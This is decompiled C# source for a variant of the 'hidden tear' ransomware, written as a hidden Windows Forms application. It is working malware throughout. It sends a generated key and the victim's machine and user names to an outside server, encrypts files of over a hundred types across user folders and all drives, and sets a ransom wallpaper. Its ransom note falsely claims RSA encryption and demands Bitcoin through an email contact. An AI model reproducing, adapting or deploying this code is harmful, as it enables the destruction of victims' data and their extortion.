using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace hidden_tear;

public class Form1 : Form
{
	private string targetURL = "http://www1.ppay.tk/write.php?info=";

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\Users\\";

	private string pathMess = "\\Desktop\\instruction.txt";

	private string profileUser = Environment.GetEnvironmentVariable("userprofile")!.ToString();

	private string backgroundImageUrl = "http://www1.ppay.tk/hacked.jpg";

	private IContainer components = null;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		startAction();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void SendPassword(string password)
	{
		string text = computerName + "-" + userName + " " + password;
		string address = targetURL + text;
		new WebClient().DownloadString(address);
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".flyper");
	}

	public void encryptDirectory(string location, string password)
	{
		string[] source = new string[118]
		{
			".3g2", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".wav", ".mp3", ".vdi", ".vmdk",
			".vmx", ".tbk", ".bak", ".tar", ".tgz", ".gz", ".7z", ".rar", ".zip", ".bmp",
			".png", ".gif", ".jpeg", ".jpg", ".tif", ".tiff", ".psd", ".cmd", ".bat", ".vbs",
			".vb", ".odb", ".dbf", ".db", ".sql", ".ppsm", ".ppsx", ".ppam", ".pptm", ".std",
			".sxd", ".pot", ".pps", ".sti", ".sxi", ".otp", ".odp", ".wb2", ".wks", ".wk1",
			".xltx", ".xltm", ".xlsx", ".xlsm", ".xlsb", ".slk", ".xlw", ".xlt", ".xlm", ".xlc",
			".dotm", ".dotx", ".docm", ".DOT", ".xml", ".uot", ".RTF", ".pdf", ".XLS", ".PPT",
			".stw", ".sxw", ".ott", ".odt", ".DOC", ".pem", ".p12", ".csr", ".crt", ".key",
			".ppt", ".mkv", ".3gp", ".mp4", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg",
			".wmv", ".fla", ".swf", ".m3u", ".flv", ".m4u", ".3ds", ".dwg", ".dct", ".vsx ",
			".mid", ".wma", ".vtx", ".vstx", ".sh", ".odt", ".jpg", ".png", ".csv", ".sql",
			".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
		};
		try
		{
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EncryptFile(files[i], password);
				}
			}
			for (int i = 0; i < directories.Length; i++)
			{
				encryptDirectory(directories[i], password);
			}
		}
		catch
		{
		}
	}

	public void startAction()
	{
		string password = CreatePassword(21);
		SendPassword(password);
		string text = "\\Desktop";
		string text2 = "\\Downloads";
		string text3 = "\\Music";
		string text4 = "\\Pictures";
		string text5 = "\\Videos";
		string location = userDir + userName + text;
		encryptDirectory(location, password);
		string location2 = userDir + userName + text2;
		encryptDirectory(location2, password);
		string location3 = userDir + userName + text3;
		encryptDirectory(location3, password);
		string location4 = userDir + userName + text4;
		encryptDirectory(location4, password);
		string location5 = userDir + userName + text5;
		encryptDirectory(location5, password);
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			string[] array = logicalDrives;
			foreach (string text6 in array)
			{
				string location6 = text6.ToString();
				encryptDirectory(location6, password);
			}
		}
		catch
		{
		}
		string path = profileUser + "\\ransom.jpg";
		SetWallpaperFromWeb(backgroundImageUrl, path);
		messageCreator();
		openMess();
		password = null;
		Application.Exit();
	}

	public void openMess()
	{
		string fileName = profileUser + pathMess;
		Process.Start(fileName);
	}

	public void messageCreator()
	{
		string path = profileUser + pathMess;
		string[] contents = new string[14]
		{
			"Your personal files have been encrypted with strongest encryption RSA 2048 and unique key generated for this computer.", "", "We present a decrypter software which allows to decrypt and return control to all your encrypted files.", "we accept a payment with Bitcoin, there are many methods to get them.", "On these sites you can buy Bitcoin", "localbitcoin.com cex.io btcdirect.eu", "", "To get KEY and Decrypter Program :", "", "1)Send 0.5 BTC bitcoins to this address with Description your PC Computer Name",
			"Bitcoin Address 1PniPmm5kiuuAhXpBWR3QJiUtpfAAFm2SS", "", "2)Contact me by email to get your key ", "flyper01@sigaint.org"
		};
		File.WriteAllLines(path, contents);
	}

	public void SetWallpaper(string path)
	{
		SystemParametersInfo(20u, 0u, path, 3u);
	}

	private void SetWallpaperFromWeb(string url, string path)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFile(new Uri(url), path);
		SetWallpaper(path);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(274, 179));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("hidden tear");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
